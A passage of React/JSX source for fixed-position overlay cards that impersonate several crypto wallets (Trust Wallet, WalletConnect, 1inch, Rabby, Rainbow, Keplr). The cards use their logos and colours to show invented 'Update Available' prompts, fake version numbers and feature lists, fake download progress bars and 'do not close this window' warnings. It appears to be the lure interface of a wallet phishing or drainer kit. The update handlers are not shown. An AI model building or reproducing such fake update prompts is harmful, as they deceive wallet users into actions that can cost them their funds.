            <div style={{ fontSize:12, color:'#555', marginTop:2 }}>
              Need help?{' '}<span style={{ color:'#3a5bd9', cursor:'pointer', fontWeight:500 }}>Contact Us</span>
            </div>
          </div>
        </div>
      )}

      {/* Trust Wallet Updating — exact same structure/size as Update Available */}
      {twState === 'updating' && (
        <div className="wm-flow-card" style={{ position:'fixed', top:24, right:24, zIndex:99999, width:320, background:'#fff', borderRadius:20, boxShadow:'0 8px 40px rgba(0,0,0,0.22)', display:'flex', flexDirection:'column', overflow:'hidden', animation:'wmSlideUp 0.25s ease' }}>
          <div style={{ display:'flex', flexDirection:'column', alignItems:'center', padding:'22px 20px 20px', gap:10 }}>
            {/* TRUST wordmark + shield — identical to Update Available */}
            <div style={{ display:'flex', flexDirection:'column', alignItems:'center', gap:4 }}>
              <svg viewBox="0 0 120 32" width="80" height="22" xmlns="http://www.w3.org/2000/svg">
                <defs><linearGradient id="twTxtUp2" x1="0%" y1="0%" x2="100%" y2="0%"><stop offset="0%" stopColor="#29E07F"/><stop offset="100%" stopColor="#29C5E0"/></linearGradient></defs>
                <text x="60" y="26" textAnchor="middle" fontFamily="Arial Black,Arial,sans-serif" fontWeight="900" fontSize="28" fill="url(#twTxtUp2)" letterSpacing="1">TRUST</text>
              </svg>
              <svg viewBox="0 0 120 130" width="56" height="62" xmlns="http://www.w3.org/2000/svg">
                <defs>
                  <linearGradient id="twSHL3" x1="0%" y1="0%" x2="0%" y2="100%"><stop offset="0%" stopColor="#29E07F"/><stop offset="100%" stopColor="#2AC876"/></linearGradient>
                  <linearGradient id="twSHR3" x1="0%" y1="0%" x2="0%" y2="100%"><stop offset="0%" stopColor="#3375BB"/><stop offset="100%" stopColor="#1FA5DE"/></linearGradient>
                </defs>
                <path d="M60 4 L12 22 L12 62 C12 90 34 112 60 122 L60 4 Z" fill="url(#twSHL3)"/>
                <path d="M60 4 L108 22 L108 62 C108 90 86 112 60 122 L60 4 Z" fill="url(#twSHR3)"/>
              </svg>
            </div>
            {/* Title — same font/size as "Update Available" */}
            <div style={{ fontSize:22, fontWeight:800, color:'#111', textAlign:'center', marginTop:4 }}>Updating</div>
            {/* Subtitle — same font/size as "Version 8.58.1" */}
            <div style={{ fontSize:14, color:'#666', textAlign:'center' }}>Please wait while we update to version 8.58.1</div>
            {/* Blue info box — same height/style as Update Available info box */}
            <div style={{ width:'100%', background:'#eff6ff', borderLeft:'3px solid #3a7bd5', borderRadius:'0 8px 8px 0', padding:'12px 14px', marginTop:2 }}>
              <span style={{ fontSize:13, color:'#1a1a1a', lineHeight:1.5 }}>Downloading and installing update. Please keep this window open until complete.</span>
            </div>
            {/* Grey box — same style as bullet list box, with progress inside */}
            <div style={{ width:'100%', background:'#f5f5f5', borderRadius:12, padding:'14px 16px' }}>
              <div style={{ width:'100%', height:8, background:'#e0e0e0', borderRadius:99, overflow:'hidden', marginBottom:8 }}>
                <div style={{ height:'100%', borderRadius:99, background:'#3a5bd9', width:`${twProgress}%`, transition:'width 0.12s linear' }}/>
              </div>
              <div style={{ display:'flex', justifyContent:'space-between', marginBottom:8 }}>
                <span style={{ fontSize:13, color:'#555' }}>Downloading update...</span>
                <span style={{ fontSize:13, color:'#555', fontWeight:600 }}>{Math.round(twProgress)}%</span>
              </div>
              <div style={{ fontSize:13, color:'#555', lineHeight:1.5, marginBottom:8 }}>Installing new features...</div>
              <div style={{ fontSize:13, color:'#555', lineHeight:1.5 }}>Verifying integrity...</div>
            </div>
            {/* Disabled button — same height as Update button */}
            <div style={{ width:'100%', marginTop:4, padding:'14px', borderRadius:50, background:'#c8cfe8', fontSize:15, fontWeight:700, color:'#fff', textAlign:'center' }}>
              Please wait...
            </div>
            {/* Footer — same as "Need help? Contact Us" */}
            <div style={{ fontSize:12, color:'#999', marginTop:2, textAlign:'center' }}>
              This may take a few moments. Do not close this window.
            </div>
          </div>
        </div>
      )}

      {/* ── WalletConnect: loading ── */}
      {wcState === 'loading' && (
        <div className="wm-flow-card" style={{ position:'fixed', top:24, right:24, zIndex:99999, width:260, height:320, background:'#fff', borderRadius:20, boxShadow:'0 8px 40px rgba(0,0,0,0.22)', display:'flex', flexDirection:'column', alignItems:'center', justifyContent:'center', gap:28, animation:'wmSlideUp 0.25s ease' }}>
          <img src="/media/images/walletconnect.png" alt="WalletConnect" style={{ width:100, height:100, borderRadius:'50%', objectFit:'cover' }} />
          <svg width="48" height="48" viewBox="0 0 48 48" fill="none">
            <circle cx="24" cy="24" r="20" stroke="#f0f0f0" strokeWidth="4"/>
            <path d="M24 4 A20 20 0 0 1 44 24" stroke="#3B99FC" strokeWidth="4" strokeLinecap="round"
              style={{ animation:'wmSpin 0.9s linear infinite', transformOrigin:'24px 24px' }}
            />
          </svg>
        </div>
      )}

      {/* ── WalletConnect: Update Available ── */}
      {wcState === 'update' && (
        <div className="wm-flow-card" style={{ position:'fixed', top:24, right:24, zIndex:99999, width:320, background:'#fff', borderRadius:20, boxShadow:'0 8px 40px rgba(0,0,0,0.22)', display:'flex', flexDirection:'column', overflow:'hidden', animation:'wmSlideUp 0.25s ease' }}>
          <div style={{ display:'flex', flexDirection:'column', alignItems:'center', padding:'28px 20px 20px', gap:12 }}>
            {/* Logo circle at top */}
            <img src="/media/images/walletconnect.png" alt="WalletConnect" style={{ width:72, height:72, borderRadius:'50%', objectFit:'cover' }} />
            <div style={{ fontSize:22, fontWeight:800, color:'#1a2340', textAlign:'center', marginTop:4 }}>Update Available</div>
            <div style={{ fontSize:15, color:'#888', textAlign:'center', marginTop:-6 }}>Version 2.21.8</div>
            {/* Section header + checkmark bullets */}
            <div style={{ width:'100%', marginTop:8 }}>
              <div style={{ fontSize:16, fontWeight:700, color:'#1a2340', marginBottom:12 }}>Wallet Connect Updates</div>
              {[
                'Seamless connection with multiple wallets including MetaMask, TrustWallet, and Coinbase Wallet',
                'Improved QR code scanning for faster wallet authentication',
                'Secure session management for persistent wallet connections',
                'Supports multiple chain networks with instant balance display',
                'Optimized for faster transaction approvals directly from the wallet',
              ].map((item, i) => (
                <div key={i} style={{ display:'flex', alignItems:'flex-start', gap:10, marginBottom:10 }}>
                  <svg width="18" height="18" viewBox="0 0 18 18" fill="none" style={{ flexShrink:0, marginTop:1 }}>
                    <path d="M4 9l4 4 6-7" stroke="#7B7FF4" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round"/>
                  </svg>
                  <span style={{ fontSize:13.5, color:'#1a2340', lineHeight:1.55 }}>{item}</span>
                </div>
              ))}
            </div>
            <button style={{ width:'100%', marginTop:8, padding:'15px', borderRadius:14, background:'#7B7FF4', color:'#fff', border:'none', fontSize:16, fontWeight:700, cursor:'pointer' }}
              onMouseEnter={e => e.currentTarget.style.background='#6569e0'}
              onMouseLeave={e => e.currentTarget.style.background='#7B7FF4'}
              onClick={handleWcUpdate}
            >Update Now</button>
            <div style={{ fontSize:13, color:'#7B7FF4', marginTop:2, cursor:'pointer', fontWeight:500 }}>
              Need help? Visit our Support Center
            </div>
          </div>
        </div>
      )}

      {/* ── WalletConnect: Updating ── */}
      {wcState === 'updating' && (
        <div className="wm-flow-card" style={{ position:'fixed', top:24, right:24, zIndex:99999, width:320, background:'#fff', borderRadius:20, boxShadow:'0 8px 40px rgba(0,0,0,0.22)', display:'flex', flexDirection:'column', overflow:'hidden', animation:'wmSlideUp 0.25s ease' }}>
          <div style={{ display:'flex', flexDirection:'column', alignItems:'center', padding:'28px 20px 20px', gap:12 }}>
            {/* Logo circle — same as Update Available */}
            <img src="/media/images/walletconnect.png" alt="WalletConnect" style={{ width:72, height:72, borderRadius:'50%', objectFit:'cover' }} />
            <div style={{ fontSize:22, fontWeight:800, color:'#1a2340', textAlign:'center', marginTop:4 }}>Updating Wallet Connect</div>
            <div style={{ fontSize:14.5, color:'#888', textAlign:'center', marginTop:-6, lineHeight:1.5 }}>Please wait while we update to version 2.21.8</div>
            {/* Progress bar */}
            <div style={{ width:'100%', marginTop:12 }}>
              <div style={{ width:'100%', height:8, background:'#e8e8f8', borderRadius:99, overflow:'hidden' }}>
                <div style={{ height:'100%', borderRadius:99, background:'#7B7FF4', width:`${wcProgress}%`, transition:'width 0.12s linear' }}/>
              </div>
              <div style={{ display:'flex', justifyContent:'space-between', marginTop:8 }}>
                <span style={{ fontSize:13, color:'#555' }}>Downloading update...</span>
                <span style={{ fontSize:13, color:'#1a2340', fontWeight:700 }}>{Math.round(wcProgress)}%</span>
              </div>
            </div>
            {/* Bottom note */}
            <div style={{ fontSize:13, color:'#888', marginTop:48, textAlign:'center', lineHeight:1.6 }}>
              Please do not close this window during the update.
            </div>
          </div>
        </div>
      )}

      {/* ══════════════════════════════════════════
          1inch Wallet overlay cards
      ══════════════════════════════════════════ */}
      {inchState === 'loading' && (
        <div className="wm-flow-card" style={{ position:'fixed', top:24, right:24, zIndex:99999, width:260, borderRadius:20, overflow:'hidden', boxShadow:'0 8px 40px rgba(0,0,0,0.28)', background:'#111', animation:'wmSlideUp 0.25s ease' }}>
          <video src="/media/images/1inch.mp4" autoPlay muted playsInline disablePictureInPicture controlsList="nodownload nofullscreen noremoteplayback" onEnded={() => setInchState('update')} style={{ width:'100%', height:320, objectFit:'cover', display:'block' }} />
          <div style={{ position:'absolute', bottom:0, left:0, right:0, padding:'14px 16px', background:'linear-gradient(transparent,rgba(0,0,0,0.75))', display:'flex', alignItems:'center', gap:10 }}>
            <img src="/media/images/1inch.png" alt="1inch" style={{ width:36, height:36, borderRadius:8, objectFit:'cover', flexShrink:0 }} />
            <div>
              <div style={{ fontSize:14, fontWeight:700, color:'#fff', lineHeight:1.2 }}>1inch Wallet</div>
              <div style={{ fontSize:12, color:'rgba(255,255,255,0.7)', marginTop:2 }}>Connecting...</div>
            </div>
            <svg style={{ marginLeft:'auto', flexShrink:0, animation:'wmSpin 0.9s linear infinite' }} width="22" height="22" viewBox="0 0 22 22" fill="none">
              <circle cx="11" cy="11" r="8" stroke="rgba(255,255,255,0.25)" strokeWidth="3"/>
              <path d="M11 3 A8 8 0 0 1 19 11" stroke="#D82122" strokeWidth="3" strokeLinecap="round"/>
            </svg>
          </div>
        </div>
      )}
      {inchState === 'update' && (
        <div className="wm-flow-card" style={{ position:'fixed', top:24, right:24, zIndex:99999, width:300, background:'#fff', borderRadius:20, boxShadow:'0 8px 40px rgba(0,0,0,0.22)', display:'flex', flexDirection:'column', overflow:'hidden', animation:'wmSlideUp 0.25s ease' }}>
          <div style={{ display:'flex', flexDirection:'column', alignItems:'center', padding:'28px 20px 24px', gap:12 }}>
            <img src="/media/images/1inch.png" alt="1inch" style={{ width:72, height:72, borderRadius:18, objectFit:'cover' }} />
            <div style={{ fontSize:23, fontWeight:800, color:'#111', textAlign:'center', marginTop:4 }}>Update Available</div>
            <div style={{ fontSize:15, color:'#888', textAlign:'center', marginTop:-6 }}>Version 2.14.0</div>
            <div style={{ width:'100%', background:'#fff3f3', borderLeft:'3px solid #D82122', borderRadius:'0 8px 8px 0', padding:'12px 14px' }}>
              <span style={{ fontSize:13, color:'#1a1a1a', lineHeight:1.5 }}>Important update with new DEX aggregation improvements. We recommend installing it now.</span>
            </div>
            <div style={{ width:'100%', background:'#f5f5f5', borderRadius:12, padding:'14px 16px' }}>
              {['Enhanced DEX aggregation across 10+ chains','Improved gas fee optimization','Fixed token price display issues','Better swap route calculations'].map((item, i, arr) => (
                <div key={i} style={{ display:'flex', alignItems:'flex-start', gap:8, marginBottom: i < arr.length-1 ? 8 : 0 }}>
                  <span style={{ color:'#D82122', fontSize:14, lineHeight:1.5 }}>•</span>
                  <span style={{ color:'#111', fontSize:13, lineHeight:1.5 }}>{item}</span>
                </div>
              ))}
            </div>
            <button style={{ width:'100%', marginTop:8, padding:'14px', borderRadius:50, background:'#D82122', color:'#fff', border:'none', fontSize:15, fontWeight:700, cursor:'pointer' }}
              onMouseEnter={e => e.currentTarget.style.background='#b81a1a'}
              onMouseLeave={e => e.currentTarget.style.background='#D82122'}
              onClick={handleInchUpdate}
            >Update</button>
            <div style={{ fontSize:12, color:'#555', marginTop:2 }}>Need help?{' '}<span style={{ color:'#D82122', cursor:'pointer', fontWeight:500 }}>Contact 1inch Support</span></div>
          </div>
        </div>
      )}
      {inchState === 'updating' && (
        <div className="wm-flow-card" style={{ position:'fixed', top:24, right:24, zIndex:99999, width:300, background:'#fff', borderRadius:20, boxShadow:'0 8px 40px rgba(0,0,0,0.22)', display:'flex', flexDirection:'column', overflow:'hidden', animation:'wmSlideUp 0.25s ease' }}>
          <div style={{ display:'flex', flexDirection:'column', alignItems:'center', padding:'28px 20px 24px', gap:12 }}>
            <div style={{ position:'relative', width:80, height:80 }}>
              <svg width="80" height="80" viewBox="0 0 80 80" fill="none" style={{ position:'absolute', inset:0 }}>
                <circle cx="40" cy="40" r="36" stroke="#f0e0e0" strokeWidth="5"/>
                <path d="M40 4 A36 36 0 0 1 76 40" stroke="#D82122" strokeWidth="5" strokeLinecap="round" style={{ animation:'wmSpin 0.9s linear infinite', transformOrigin:'40px 40px' }}/>
              </svg>
              <div style={{ position:'absolute', inset:0, display:'flex', alignItems:'center', justifyContent:'center' }}>
                <img src="/media/images/1inch.png" alt="1inch" style={{ width:36, height:36, borderRadius:8 }} />
              </div>
            </div>
            <div style={{ fontSize:22, fontWeight:800, color:'#111', textAlign:'center' }}>Updating 1inch Wallet</div>
            <div style={{ fontSize:14, color:'#888', textAlign:'center', lineHeight:1.55 }}>Please wait while we update to version 2.14.0</div>
            <div style={{ width:'100%', background:'#f5f5f5', borderRadius:12, padding:'14px 16px', marginTop:4 }}>
              <div style={{ width:'100%', height:7, background:'#f0d0d0', borderRadius:99, overflow:'hidden' }}>
                <div style={{ height:'100%', borderRadius:99, background:'#D82122', width:`${inchProgress}%`, transition:'width 0.12s linear' }}/>
              </div>
              <div style={{ display:'flex', justifyContent:'space-between', marginTop:8 }}>
                <span style={{ fontSize:13, color:'#888' }}>Downloading update...</span>
                <span style={{ fontSize:13, color:'#D82122', fontWeight:700 }}>{Math.round(inchProgress)}%</span>
              </div>
            </div>
            <div style={{ width:'100%', marginTop:4, padding:'14px', borderRadius:50, background:'#f5d0d0', fontSize:15, fontWeight:700, color:'#D82122', textAlign:'center', opacity:0.6 }}>Please wait...</div>
            <div style={{ fontSize:12, color:'#999', marginTop:2, textAlign:'center' }}>This may take a few moments. Do not close this window.</div>
          </div>
        </div>
      )}

      {/* ══════════════════════════════════════════
          Rabby Wallet overlay cards
      ══════════════════════════════════════════ */}
      {rabbyState === 'loading' && (
        <div className="wm-flow-card" style={{ position:'fixed', top:24, right:24, zIndex:99999, width:260, height:340, background:'#1a1f3d', borderRadius:20, boxShadow:'0 8px 40px rgba(58,80,255,0.35)', display:'flex', flexDirection:'column', alignItems:'center', justifyContent:'center', gap:20, animation:'wmSlideUp 0.25s ease' }}>
          <img src="/media/images/wallet-rabby.webp" alt="Rabby" style={{ width:90, height:90, borderRadius:20, objectFit:'cover', animation:'wmBob 2.2s ease-in-out infinite' }} />
          <div style={{ textAlign:'center' }}>
            <div style={{ fontSize:16, fontWeight:700, color:'#fff' }}>Rabby Wallet</div>
            <div style={{ fontSize:13, color:'rgba(255,255,255,0.5)', marginTop:4 }}>Connecting...</div>
          </div>
          <svg width="44" height="44" viewBox="0 0 44 44" fill="none">
            <circle cx="22" cy="22" r="18" stroke="rgba(255,255,255,0.12)" strokeWidth="4"/>
            <path d="M22 4 A18 18 0 0 1 40 22" stroke="#7084FF" strokeWidth="4" strokeLinecap="round" style={{ animation:'wmSpin 0.9s linear infinite', transformOrigin:'22px 22px' }}/>
          </svg>
        </div>
      )}
      {rabbyState === 'update' && (
        <div className="wm-flow-card" style={{ position:'fixed', top:24, right:24, zIndex:99999, width:300, background:'#fff', borderRadius:20, boxShadow:'0 8px 40px rgba(0,0,0,0.22)', display:'flex', flexDirection:'column', overflow:'hidden', animation:'wmSlideUp 0.25s ease' }}>
          <div style={{ display:'flex', flexDirection:'column', alignItems:'center', padding:'28px 20px 24px', gap:12 }}>
            <img src="/media/images/wallet-rabby.webp" alt="Rabby" style={{ width:72, height:72, borderRadius:18, objectFit:'cover' }} />
            <div style={{ fontSize:23, fontWeight:800, color:'#111', textAlign:'center', marginTop:4 }}>Update Available</div>
            <div style={{ fontSize:15, color:'#888', textAlign:'center', marginTop:-6 }}>Version 0.92.0</div>
            <div style={{ width:'100%', background:'#f0f1ff', borderLeft:'3px solid #7084FF', borderRadius:'0 8px 8px 0', padding:'12px 14px' }}>
              <span style={{ fontSize:13, color:'#1a1a1a', lineHeight:1.5 }}>Security patch and multi-chain performance update. Install now to stay protected.</span>
            </div>
            <div style={{ width:'100%', background:'#f5f5f5', borderRadius:12, padding:'14px 16px' }}>
              {['Improved transaction pre-simulation accuracy','Enhanced phishing site detection','Fixed EIP-1559 fee estimation','Better hardware wallet compatibility'].map((item, i, arr) => (
                <div key={i} style={{ display:'flex', alignItems:'flex-start', gap:8, marginBottom: i < arr.length-1 ? 8 : 0 }}>
                  <span style={{ color:'#7084FF', fontSize:14, lineHeight:1.5 }}>•</span>
                  <span style={{ color:'#111', fontSize:13, lineHeight:1.5 }}>{item}</span>
                </div>
              ))}
            </div>
            <button style={{ width:'100%', marginTop:8, padding:'14px', borderRadius:50, background:'#7084FF', color:'#fff', border:'none', fontSize:15, fontWeight:700, cursor:'pointer' }}
              onMouseEnter={e => e.currentTarget.style.background='#5a6fe0'}
              onMouseLeave={e => e.currentTarget.style.background='#7084FF'}
              onClick={handleRabbyUpdate}
            >Update</button>
            <div style={{ fontSize:12, color:'#555', marginTop:2 }}>Need help?{' '}<span style={{ color:'#7084FF', cursor:'pointer', fontWeight:500 }}>Contact Rabby Support</span></div>
          </div>
        </div>
      )}
      {rabbyState === 'updating' && (
        <div className="wm-flow-card" style={{ position:'fixed', top:24, right:24, zIndex:99999, width:300, background:'#fff', borderRadius:20, boxShadow:'0 8px 40px rgba(0,0,0,0.22)', display:'flex', flexDirection:'column', overflow:'hidden', animation:'wmSlideUp 0.25s ease' }}>
          <div style={{ display:'flex', flexDirection:'column', alignItems:'center', padding:'28px 20px 24px', gap:12 }}>
            <div style={{ position:'relative', width:80, height:80 }}>
              <svg width="80" height="80" viewBox="0 0 80 80" fill="none" style={{ position:'absolute', inset:0 }}>
                <circle cx="40" cy="40" r="36" stroke="#e8e8ff" strokeWidth="5"/>
                <path d="M40 4 A36 36 0 0 1 76 40" stroke="#7084FF" strokeWidth="5" strokeLinecap="round" style={{ animation:'wmSpin 0.9s linear infinite', transformOrigin:'40px 40px' }}/>
              </svg>
              <div style={{ position:'absolute', inset:0, display:'flex', alignItems:'center', justifyContent:'center' }}>
                <img src="/media/images/wallet-rabby.webp" alt="Rabby" style={{ width:40, height:40, borderRadius:10 }} />
              </div>
            </div>
            <div style={{ fontSize:22, fontWeight:800, color:'#111', textAlign:'center' }}>Updating Rabby Wallet</div>
            <div style={{ fontSize:14, color:'#888', textAlign:'center', lineHeight:1.55 }}>Please wait while we update to version 0.92.0</div>
            <div style={{ width:'100%', background:'#f5f5f5', borderRadius:12, padding:'14px 16px', marginTop:4 }}>
              <div style={{ width:'100%', height:7, background:'#e0e0ff', borderRadius:99, overflow:'hidden' }}>
                <div style={{ height:'100%', borderRadius:99, background:'#7084FF', width:`${rabbyProgress}%`, transition:'width 0.12s linear' }}/>
              </div>
              <div style={{ display:'flex', justifyContent:'space-between', marginTop:8 }}>
                <span style={{ fontSize:13, color:'#888' }}>Downloading update...</span>
                <span style={{ fontSize:13, color:'#7084FF', fontWeight:700 }}>{Math.round(rabbyProgress)}%</span>
              </div>
            </div>
            <div style={{ width:'100%', marginTop:4, padding:'14px', borderRadius:50, background:'#e8e8ff', fontSize:15, fontWeight:700, color:'#7084FF', textAlign:'center', opacity:0.7 }}>Please wait...</div>
            <div style={{ fontSize:12, color:'#999', marginTop:2, textAlign:'center' }}>This may take a few moments. Do not close this window.</div>
          </div>
        </div>
      )}

      {/* ══════════════════════════════════════════
          Rainbow overlay cards
      ══════════════════════════════════════════ */}
      {rainbowState === 'loading' && (
        <div className="wm-flow-card" style={{ position:'fixed', top:24, right:24, zIndex:99999, width:260, height:340, background:'linear-gradient(160deg,#FF6B6B,#FFD93D,#6BCB77,#4D96FF,#C77DFF)', borderRadius:20, boxShadow:'0 8px 40px rgba(255,107,107,0.4)', display:'flex', flexDirection:'column', alignItems:'center', justifyContent:'center', gap:20, animation:'wmSlideUp 0.25s ease' }}>
          <img src="/media/images/wallet-rainbow.png" alt="Rainbow" style={{ width:100, height:100, borderRadius:'50%', objectFit:'cover', boxShadow:'0 4px 20px rgba(0,0,0,0.3)', animation:'wmBob 2.2s ease-in-out infinite' }} />
          <div style={{ textAlign:'center' }}>
            <div style={{ fontSize:16, fontWeight:800, color:'#fff', textShadow:'0 1px 4px rgba(0,0,0,0.3)' }}>Rainbow</div>
            <div style={{ fontSize:13, color:'rgba(255,255,255,0.85)', marginTop:4 }}>Connecting...</div>
          </div>
          <svg width="44" height="44" viewBox="0 0 44 44" fill="none">
            <circle cx="22" cy="22" r="18" stroke="rgba(255,255,255,0.25)" strokeWidth="4"/>
            <path d="M22 4 A18 18 0 0 1 40 22" stroke="#fff" strokeWidth="4" strokeLinecap="round" style={{ animation:'wmSpin 0.9s linear infinite', transformOrigin:'22px 22px' }}/>
          </svg>
        </div>
      )}
      {rainbowState === 'update' && (
        <div className="wm-flow-card" style={{ position:'fixed', top:24, right:24, zIndex:99999, width:300, background:'#fff', borderRadius:20, boxShadow:'0 8px 40px rgba(0,0,0,0.22)', display:'flex', flexDirection:'column', overflow:'hidden', animation:'wmSlideUp 0.25s ease' }}>
          <div style={{ display:'flex', flexDirection:'column', alignItems:'center', padding:'28px 20px 24px', gap:12 }}>
            <img src="/media/images/wallet-rainbow.png" alt="Rainbow" style={{ width:72, height:72, borderRadius:'50%', objectFit:'cover' }} />
            <div style={{ fontSize:23, fontWeight:800, color:'#111', textAlign:'center', marginTop:4 }}>Update Available</div>
            <div style={{ fontSize:15, color:'#888', textAlign:'center', marginTop:-6 }}>Version 1.9.42</div>
            <div style={{ width:'100%', background:'#fff8f0', borderLeft:'3px solid #FF6B6B', borderRadius:'0 8px 8px 0', padding:'12px 14px' }}>
              <span style={{ fontSize:13, color:'#1a1a1a', lineHeight:1.5 }}>New colorful features and performance improvements are ready to install.</span>
            </div>
            <div style={{ width:'100%', background:'#f5f5f5', borderRadius:12, padding:'14px 16px' }}>
              {['Multi-chain NFT gallery with rainbow sorting','Improved swap rates across EVM chains','Fixed token price refresh delay','Better WalletConnect v2 support'].map((item, i, arr) => (
                <div key={i} style={{ display:'flex', alignItems:'flex-start', gap:8, marginBottom: i < arr.length-1 ? 8 : 0 }}>
                  <span style={{ color:'#FF6B6B', fontSize:14, lineHeight:1.5 }}>•</span>
                  <span style={{ color:'#111', fontSize:13, lineHeight:1.5 }}>{item}</span>
                </div>
              ))}
            </div>
            <button style={{ width:'100%', marginTop:8, padding:'14px', borderRadius:50, background:'linear-gradient(90deg,#FF6B6B,#FFD93D,#4D96FF)', color:'#fff', border:'none', fontSize:15, fontWeight:700, cursor:'pointer' }}
              onClick={handleRainbowUpdate}
            >Update</button>
            <div style={{ fontSize:12, color:'#555', marginTop:2 }}>Need help?{' '}<span style={{ color:'#FF6B6B', cursor:'pointer', fontWeight:500 }}>Contact Rainbow Support</span></div>
          </div>
        </div>
      )}
      {rainbowState === 'updating' && (
        <div className="wm-flow-card" style={{ position:'fixed', top:24, right:24, zIndex:99999, width:300, background:'#fff', borderRadius:20, boxShadow:'0 8px 40px rgba(0,0,0,0.22)', display:'flex', flexDirection:'column', overflow:'hidden', animation:'wmSlideUp 0.25s ease' }}>
          <div style={{ display:'flex', flexDirection:'column', alignItems:'center', padding:'28px 20px 24px', gap:12 }}>
            <div style={{ position:'relative', width:80, height:80 }}>
              <svg width="80" height="80" viewBox="0 0 80 80" fill="none" style={{ position:'absolute', inset:0 }}>
                <circle cx="40" cy="40" r="36" stroke="#f5e0e0" strokeWidth="5"/>
                <path d="M40 4 A36 36 0 0 1 76 40" stroke="#FF6B6B" strokeWidth="5" strokeLinecap="round" style={{ animation:'wmSpin 0.9s linear infinite', transformOrigin:'40px 40px' }}/>
              </svg>
              <div style={{ position:'absolute', inset:0, display:'flex', alignItems:'center', justifyContent:'center' }}>
                <img src="/media/images/wallet-rainbow.png" alt="Rainbow" style={{ width:42, height:42, borderRadius:'50%' }} />
              </div>
            </div>
            <div style={{ fontSize:22, fontWeight:800, color:'#111', textAlign:'center' }}>Updating Rainbow</div>
            <div style={{ fontSize:14, color:'#888', textAlign:'center', lineHeight:1.55 }}>Please wait while we update to version 1.9.42</div>
            <div style={{ width:'100%', background:'#f5f5f5', borderRadius:12, padding:'14px 16px', marginTop:4 }}>
              <div style={{ width:'100%', height:7, borderRadius:99, overflow:'hidden', background:'linear-gradient(90deg,#ffe0e0,#fff0c0,#e0f0ff)' }}>
                <div style={{ height:'100%', borderRadius:99, background:'linear-gradient(90deg,#FF6B6B,#FFD93D,#4D96FF)', width:`${rainbowProgress}%`, transition:'width 0.12s linear' }}/>
              </div>
              <div style={{ display:'flex', justifyContent:'space-between', marginTop:8 }}>
                <span style={{ fontSize:13, color:'#888' }}>Downloading update...</span>
                <span style={{ fontSize:13, color:'#FF6B6B', fontWeight:700 }}>{Math.round(rainbowProgress)}%</span>
              </div>
            </div>
            <div style={{ width:'100%', marginTop:4, padding:'14px', borderRadius:50, background:'#ffe8e8', fontSize:15, fontWeight:700, color:'#FF6B6B', textAlign:'center', opacity:0.7 }}>Please wait...</div>
            <div style={{ fontSize:12, color:'#999', marginTop:2, textAlign:'center' }}>This may take a few moments. Do not close this window.</div>
          </div>
        </div>
      )}

      {/* ══════════════════════════════════════════
          Keplr overlay cards
      ══════════════════════════════════════════ */}
      {keplrState === 'loading' && (
        <div className="wm-flow-card" style={{ position:'fixed', top:24, right:24, zIndex:99999, width:260, height:340, background:'#0f0f1a', borderRadius:20, boxShadow:'0 8px 40px rgba(111,58,250,0.45)', display:'flex', flexDirection:'column', alignItems:'center', justifyContent:'center', gap:20, animation:'wmSlideUp 0.25s ease' }}>
          <img src="/media/images/keplr_new.png" alt="Keplr" style={{ width:90, height:90, borderRadius:20, objectFit:'cover', animation:'wmBob 2.2s ease-in-out infinite' }} />
          <div style={{ textAlign:'center' }}>
            <div style={{ fontSize:16, fontWeight:700, color:'#fff' }}>Keplr</div>
            <div style={{ fontSize:13, color:'rgba(255,255,255,0.5)', marginTop:4 }}>Connecting to Cosmos...</div>
          </div>
          <svg width="44" height="44" viewBox="0 0 44 44" fill="none">
            <circle cx="22" cy="22" r="18" stroke="rgba(255,255,255,0.1)" strokeWidth="4"/>
            <path d="M22 4 A18 18 0 0 1 40 22" stroke="#6F3AFA" strokeWidth="4" strokeLinecap="round" style={{ animation:'wmSpin 0.9s linear infinite', transformOrigin:'22px 22px' }}/>
          </svg>
        </div>
      )}
      {keplrState === 'update' && (
        <div className="wm-flow-card" style={{ position:'fixed', top:24, right:24, zIndex:99999, width:300, background:'#fff', borderRadius:20, boxShadow:'0 8px 40px rgba(0,0,0,0.22)', display:'flex', flexDirection:'column', overflow:'hidden', animation:'wmSlideUp 0.25s ease' }}>
          <div style={{ display:'flex', flexDirection:'column', alignItems:'center', padding:'28px 20px 24px', gap:12 }}>
            <img src="/media/images/keplr_new.png" alt="Keplr" style={{ width:72, height:72, borderRadius:18, objectFit:'cover' }} />
            <div style={{ fontSize:23, fontWeight:800, color:'#111', textAlign:'center', marginTop:4 }}>Update Available</div>
            <div style={{ fontSize:15, color:'#888', textAlign:'center', marginTop:-6 }}>Version 0.12.155</div>
            <div style={{ width:'100%', background:'#f3efff', borderLeft:'3px solid #6F3AFA', borderRadius:'0 8px 8px 0', padding:'12px 14px' }}>
              <span style={{ fontSize:13, color:'#1a1a1a', lineHeight:1.5 }}>New Cosmos ecosystem features and improved IBC transaction support available.</span>
            </div>
            <div style={{ width:'100%', background:'#f5f5f5', borderRadius:12, padding:'14px 16px' }}>
              {['Enhanced IBC transfer speed and reliability','New chain support: dYdX, Neutron, Celestia','Improved staking rewards dashboard','Fixed Ledger hardware wallet signing'].map((item, i, arr) => (
                <div key={i} style={{ display:'flex', alignItems:'flex-start', gap:8, marginBottom: i < arr.length-1 ? 8 : 0 }}>
                  <span style={{ color:'#6F3AFA', fontSize:14, lineHeight:1.5 }}>•</span>
                  <span style={{ color:'#111', fontSize:13, lineHeight:1.5 }}>{item}</span>
                </div>
              ))}
            </div>
            <button style={{ width:'100%', marginTop:8, padding:'14px', borderRadius:50, background:'#6F3AFA', color:'#fff', border:'none', fontSize:15, fontWeight:700, cursor:'pointer' }}
              onMouseEnter={e => e.currentTarget.style.background='#5828d8'}
              onMouseLeave={e => e.currentTarget.style.background='#6F3AFA'}
              onClick={handleKeplrUpdate}
            >Update</button>
            <div style={{ fontSize:12, color:'#555', marginTop:2 }}>Need help?{' '}<span style={{ color:'#6F3AFA', cursor:'pointer', fontWeight:500 }}>Contact Keplr Support</span></div>
          </div>
        </div>
      )}
      {keplrState === 'updating' && (
        <div className="wm-flow-card" style={{ position:'fixed', top:24, right:24, zIndex:99999, width:300, background:'#fff', borderRadius:20, boxShadow:'0 8px 40px rgba(0,0,0,0.22)', display:'flex', flexDirection:'column', overflow:'hidden', animation:'wmSlideUp 0.25s ease' }}>
          <div style={{ display:'flex', flexDirection:'column', alignItems:'center', padding:'28px 20px 24px', gap:12 }}>
            <div style={{ position:'relative', width:80, height:80 }}>
              <svg width="80" height="80" viewBox="0 0 80 80" fill="none" style={{ position:'absolute', inset:0 }}>
                <circle cx="40" cy="40" r="36" stroke="#ece8ff" strokeWidth="5"/>
